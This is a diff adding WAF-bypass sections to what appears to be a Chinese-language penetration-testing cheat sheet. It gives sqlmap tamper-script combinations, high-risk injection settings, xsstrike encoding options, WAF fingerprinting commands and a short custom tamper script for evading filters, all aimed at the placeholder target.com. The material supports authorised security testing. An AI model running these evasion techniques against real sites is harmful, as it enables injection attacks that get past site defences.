@@ -98,6 +98,77 @@ python3 /path/to/xsstrike.py -u "http://target.com/search?q=test"
 dalfox url "http://target.com?q=test"
 ```
 
+### 6. WAF 绕过
+
+```bash
+# WAF 识别
+whatwaf -u http://target.com
+
+# SQL 注入绕过
+sqlmap -u "http://target.com?id=1" --tamper=space2comment,between,randomcase
+
+# XSS 绕过测试
+xsstrike -u "http://target.com/search?q=test" --encode
+```
+
+### 7. WAF 绕过 (详细)
+
+```bash
+# WAF 识别
+whatwaf --esp -u http://target.com
+wafw00f http://target.com
+
+# SQL 注入绕过 - 常用 tamper 组合
+sqlmap -u "http://target.com?id=1" --tamper=space2comment,between,charencode
+sqlmap -u "http://target.com?id=1" --tamper=space2comment,randomcase
+sqlmap -u "http://target.com?id=1" --tamper=between,equaltolike
+
+# 高风险测试
+sqlmap -u "http://target.com?id=1" --level=5 --risk=3 --tamper=space2comment,between,randomcase
+
+# XSS 绕过
+xsstrike -u "http://target.com/search?q=test" --encode
+xsstrike -u "http://target.com/search?q=test" --json
+xsstrike -u "http://target.com/search?q=test" --path-override
+
+# WAF 绕过参数
+sqlmap -u "http://target.com?id=1" --random-agent --delay=1 --timeout=10
+sqlmap -u "http://target.com?id=1" --proxy=http://127.0.0.1:8080
+```
+
+### 8. WAF 绕过 Tamper 脚本
+
+SQLMap 内置 Tamper 脚本（位于 `/usr/share/sqlmap/tamper/`）：
+
+| 脚本 | 作用 |
+|------|------|
+| space2comment | 空格替换为 /**/ |
+| space2dash | 空格替换为 -- |
+| between | > 替换为 BETWEEN |
+| charencode | 字符编码 |
+| charunicodeencode | Unicode 编码 |
+| randomcase | 大小写随机 |
+| equaltolike | = 替换为 LIKE |
+| greatest | > 替换为 GREATEST |
+
+### 9. 自定义 Tamper 脚本
+
+创建自定义 Tamper（保存为 `mytamper.py`）：
+
+```python
+#!/usr/bin/env python
+def tamper(payload, **kwargs):
+    if payload:
+        payload = payload.replace(" ", "/**/")
+        payload = payload.replace("'", "/*'*/")
+    return payload
+```
+
+使用自定义 Tamper：
+```bash
+sqlmap -u "http://target.com?id=1" --tamper=mytamper
+```
+
 ## 常用命令速查
 
 | 功能 | 命令 |
